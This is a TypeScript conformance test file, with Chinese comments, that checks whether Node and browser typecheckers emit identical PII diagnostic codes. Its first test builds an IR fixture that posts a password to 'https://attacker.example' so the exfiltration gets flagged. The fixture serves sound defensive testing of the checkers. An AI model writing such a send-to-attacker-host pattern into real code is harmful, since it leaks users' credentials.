/**
 * PII 跨运行时 conformance 测试 (P0-1 / ADR-0009)
 *
 * 验证 typecheckModule（LSP / Node 路径）和 typecheckBrowser（browser /
 * CF Workers 路径）对同一 Core IR 模块产生**相同的 PII 诊断 codes**。
 *
 * 这是 ADR-0009 的核心承诺：PII 是一等公民，跨运行时一致。
 * 任何 runtime 间的 drift 都是 P0 阻塞。
 *
 * 测试策略：
 *   1. 构造覆盖典型 PII flow 场景的 Core IR（HTTP sink、降级赋值、参数泄露等）
 *   2. 分别用 typecheckModule 和 typecheckBrowser 跑
 *   3. 断言两者返回的 PII-related diagnostic codes 完全一致
 *
 * 注意：诊断**消息字符串**可能不同（locale 不同），但**code** 必须一致。
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { typecheckModule } from '../../../src/typecheck.js';
import { typecheckBrowser } from '../../../src/typecheck/browser.js';
import { ErrorCode } from '../../../src/diagnostics/error_codes.js';
import { Effect } from '../../../src/config/semantic.js';
import { Core as CoreBuilder } from '../../../src/core/core_ir.js';
import type { Core, TypecheckDiagnostic } from '../../../src/types.js';

const IO_EFFECT: readonly Effect[] = [Effect.IO];

const PII_CODES = new Set<string>([
  ErrorCode.PII_SINK_UNSANITIZED,
  ErrorCode.PII_ASSIGN_DOWNGRADE,
  ErrorCode.PII_ARG_VIOLATION,
]);

function piiCodes(diags: readonly TypecheckDiagnostic[]): string[] {
  return diags
    .filter((d) => typeof d.code === 'string' && PII_CODES.has(d.code))
    .map((d) => String(d.code))
    .sort();
}

const TEXT = (): Core.Type => CoreBuilder.TypeName('Text');
const piiType = (level: 'L1' | 'L2' | 'L3', category: Core.PiiType['category']): Core.Type =>
  CoreBuilder.Pii(TEXT(), level, category);
const piiParam = (name: string, level: 'L1' | 'L2' | 'L3'): Core.Parameter => ({
  name,
  type: piiType(level, 'email'),
});

function makeFunc(opts: {
  name: string;
  params: readonly Core.Parameter[];
  ret: Core.Type;
  body: readonly Core.Statement[];
  effects?: readonly Effect[];
}): Core.Func {
  return CoreBuilder.Func(
    opts.name,
    [],
    opts.params,
    opts.ret,
    opts.effects ?? IO_EFFECT,
    CoreBuilder.Block(opts.body),
    [],
    false,
  );
}

describe('PII 跨运行时 conformance (ADR-0009 P0-1)', () => {
  it('HTTP sink 泄露 L3 PII：Node 和 browser 路径产生相同 PII codes', () => {
    const httpImport = CoreBuilder.Import('Http', 'H');
    const fn = makeFunc({
      name: 'leak_password_via_http',
      params: [piiParam('password', 'L3')],
      ret: TEXT(),
      effects: IO_EFFECT,
      body: [
        CoreBuilder.Return(
          CoreBuilder.Call(CoreBuilder.Name('H.post'), [
            CoreBuilder.String('https://attacker.example'),
            CoreBuilder.Name('password'),
          ]),
        ),
      ],
    });
    const module: Core.Module = CoreBuilder.Module(
      'tests.pii.cross_runtime.http_leak',
      [httpImport, fn],
    );

    const nodeDiags = typecheckModule(module);
    const browserDiags = typecheckBrowser(module);

    const nodeCodes = piiCodes(nodeDiags);
    const browserCodes = piiCodes(browserDiags);

    assert.ok(nodeCodes.length > 0, 'Node 路径应捕获 PII sink 违规');
    assert.ok(
      browserCodes.length > 0,
      'Browser 路径应捕获 PII sink 违规（不再静默——ADR-0009 P0-1）',
    );
    assert.deepEqual(
      nodeCodes,
      browserCodes,
      `跨运行时 PII codes 必须一致\n  node:    ${nodeCodes.join(',')}\n  browser: ${browserCodes.join(',')}`,
    );
  });

  it('无 PII 代码：两个运行时都不应误报', () => {
    const fn = makeFunc({
      name: 'no_pii',
      params: [{ name: 'plain_text', type: TEXT() }],
      ret: TEXT(),
      effects: [Effect.PURE],
      body: [CoreBuilder.Return(CoreBuilder.Name('plain_text'))],
    });
    const module: Core.Module = CoreBuilder.Module(
      'tests.pii.cross_runtime.no_pii',
      [fn],
    );

    const nodeCodes = piiCodes(typecheckModule(module));
    const browserCodes = piiCodes(typecheckBrowser(module));

    assert.equal(nodeCodes.length, 0, 'Node 路径不应在纯文本上误报 PII');
    assert.equal(browserCodes.length, 0, 'Browser 路径不应在纯文本上误报 PII');
    assert.deepEqual(nodeCodes, browserCodes);
  });

  it('空模块：两个运行时都不应崩溃，且都返回 0 个 PII 诊断', () => {
    const module: Core.Module = CoreBuilder.Module(
      'tests.pii.cross_runtime.empty',
      [],
    );

    // 关键不变量：不抛错
    const nodeDiags = typecheckModule(module);
    const browserDiags = typecheckBrowser(module);

    assert.deepEqual(piiCodes(nodeDiags), []);
    assert.deepEqual(piiCodes(browserDiags), []);
  });
});
